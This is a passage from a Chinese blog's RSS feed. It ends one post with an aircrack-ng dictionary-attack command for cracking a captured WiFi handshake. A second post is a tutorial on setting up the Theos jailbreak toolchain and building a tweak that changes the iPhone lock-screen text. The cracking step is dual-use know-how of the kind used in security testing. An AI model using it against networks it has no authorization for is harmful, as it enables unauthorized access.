&lt;h3 id=&quot;解析&quot;&gt;解析&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;aircrack-ng -w 1.txt 1.cap
1.txt是字典暴  1.cap是抓包文件
可以看到cap包的内容，Encryption中（0 handshake）是抓包失败，（1 handshake）则是抓包成功。
记住成功的行数，Index number of target network ?后面输入行数，回车。
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Thu, 29 Dec 2016 12:00:00 +0000</pubDate>
        <link>http://localhost:4000/2016/12/29/wifi%E7%A0%B4%E8%A7%A3/</link>
        <guid isPermaLink="true">http://localhost:4000/2016/12/29/wifi%E7%A0%B4%E8%A7%A3/</guid>
        
        <category>安全</category>
        
        
      </item>
    
      <item>
        <title>theos越狱环境搭建</title>
        <description>&lt;p&gt;&lt;a href=&quot;https://github.com/theos/theos/wiki/Installation&quot;&gt;参考文档&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/YasinTian/TheosFirstDemo/tree/master&quot;&gt;demo在这里&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;ldid安装&quot;&gt;ldid安装&lt;/h2&gt;

&lt;p&gt;ldid可以在http://joedj.net/ldid 下载
复制到&lt;code class=&quot;highlighter-rouge&quot;&gt;/opt/theos/bin&lt;/code&gt;里面
执行&lt;code class=&quot;highlighter-rouge&quot;&gt;sudo chmod 777 /opt/theos/bin/ldid&lt;/code&gt;提升权限&lt;/p&gt;

&lt;h2 id=&quot;libsubstratedylib&quot;&gt;libsubstrate.dylib&lt;/h2&gt;

&lt;p&gt;这个需要用到手机助手的文件管理功能把&lt;code class=&quot;highlighter-rouge&quot;&gt;/Library/Frameworks/CydiaSubstrate.framework/CydiaSubstrate&lt;/code&gt;复制出来
改名为&lt;code class=&quot;highlighter-rouge&quot;&gt;libsubstrate.dylib&lt;/code&gt;，然后放到&lt;code class=&quot;highlighter-rouge&quot;&gt;/opt/theos/lib&lt;/code&gt; 中。&lt;/p&gt;

&lt;h2 id=&quot;dkpg安装&quot;&gt;dkpg安装&lt;/h2&gt;

&lt;p&gt;这个命令需要安装&lt;a href=&quot;https://www.macports.org/install.php&quot;&gt;MacPorts&lt;/a&gt;，选择对应的系统下下来安装即可。
&lt;code class=&quot;highlighter-rouge&quot;&gt;sudo port install dpkg&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;theos安装&quot;&gt;theos安装&lt;/h2&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cd /opt
$ git clone --recursive https://github.com/theos/theos.git
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h2 id=&quot;环境配置&quot;&gt;环境配置&lt;/h2&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;~./bash_profile&lt;/code&gt;中加入下面的代码，没有这文件就创建一个
&lt;code class=&quot;highlighter-rouge&quot;&gt;export THEOS=/opt/theos&lt;/code&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;export PATH=/opt/theos/bin/:$PATH&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;测试一下&quot;&gt;测试一下&lt;/h2&gt;

&lt;p&gt;cd到准备放工程的目录执行&lt;code class=&quot;highlighter-rouge&quot;&gt;/opt/theos/bin/nic.pl&lt;/code&gt;能输入输出下面的选项，theos就配置好了。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ /opt/theos/bin/nic.pl
NIC 2.0 - New Instance Creator
------------------------------
  [1.] iphone/activator_event
  [2.] iphone/application_modern
  [3.] iphone/cydget
  [4.] iphone/flipswitch_switch
  [5.] iphone/framework
  [6.] iphone/ios7_notification_center_widget
  [7.] iphone/library
  [8.] iphone/notification_center_widget
  [9.] iphone/preference_bundle_modern
  [10.] iphone/tool
  [11.] iphone/tweak
  [12.] iphone/xpc_service
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h2 id=&quot;运行&quot;&gt;运行&lt;/h2&gt;

&lt;p&gt;选择&lt;code class=&quot;highlighter-rouge&quot;&gt;iphone/tweak&lt;/code&gt;这个选项，输入11回车。
会让你输入工程名，bundleId，目标bundleId等。这里呢，我们只是要运行一下demo测试环境搭建是否成功，把工程名输了，其他直接回车就行了，都是有默认的。
打开工程目录下的&lt;code class=&quot;highlighter-rouge&quot;&gt;Makefile&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;include $(THEOS)/makefiles/common.mk
TWEAK_NAME = firstdemo
firstdemo_FILES = Tweak.xm
include $(THEOS_MAKE_PATH)/tweak.mk
THEOS_DEVICE_IP = 192.168.2.157	#手机的ip地址
iOSRE_FRAMEWORKS=UIKit Foundation	#导入的库
ARCHS = arm64 #手机是64位还是32位
after-install::
	install.exec &quot;killall -9 SpringBoard&quot;	#在安装成功后杀掉SpringBoard，会从新启动以加载我们的插件
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;打开工程目录下的&lt;code class=&quot;highlighter-rouge&quot;&gt;Tweak.xm&lt;/code&gt;文件
粘贴下面的代码&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#import &amp;lt;UIKit/UIKit.h&amp;gt;
#import &amp;lt;SpringBoard/SpringBoard.h&amp;gt;

%hook SBLockScreenDateViewController
- (void)setCustomSubtitleText:(id)arg1 withColor:(id)arg2
{
NSString *str = @&quot;锁屏界面的日期文字变成了这段话!&quot;;
%orig(str, arg2);
}
%end

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;最后&lt;code class=&quot;highlighter-rouge&quot;&gt;make&lt;/code&gt;编译&lt;code class=&quot;highlighter-rouge&quot;&gt;make package&lt;/code&gt;打包&lt;code class=&quot;highlighter-rouge&quot;&gt;make install&lt;/code&gt;安装，过程会叫你输入2次ssh密码,全部成功的话，你就会看到SpringBoard正在重启。重启之后锁屏界面的日期，变成了我们自定义的字符串。
如果提示THEOS_DEVICE_IP错误之类的就先输入&lt;code class=&quot;highlighter-rouge&quot;&gt;export THEOS_DEVICE_IP=手机的ip地址&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;theos的升级&quot;&gt;theos的升级&lt;/h2&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;git submodule update –recursive&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;注意&quot;&gt;注意&lt;/h2&gt;

&lt;p&gt;在一些老板的安装方法中有&lt;code class=&quot;highlighter-rouge&quot;&gt;sudo /opt/theos/bin/bootstrap.sh substrate&lt;/code&gt;,现在可以不用管了。&lt;/p&gt;
</description>
        <pubDate>Thu, 29 Dec 2016 12:00:00 +0000</pubDate>
        <link>http://localhost:4000/2016/12/29/theos%E5%AE%89%E8%A3%85/</link>
        <guid isPermaLink="true">http://localhost:4000/2016/12/29/theos%E5%AE%89%E8%A3%85/</guid>
        
        <category>安全</category>
        
        
      </item>
    
  </channel>
</rss>
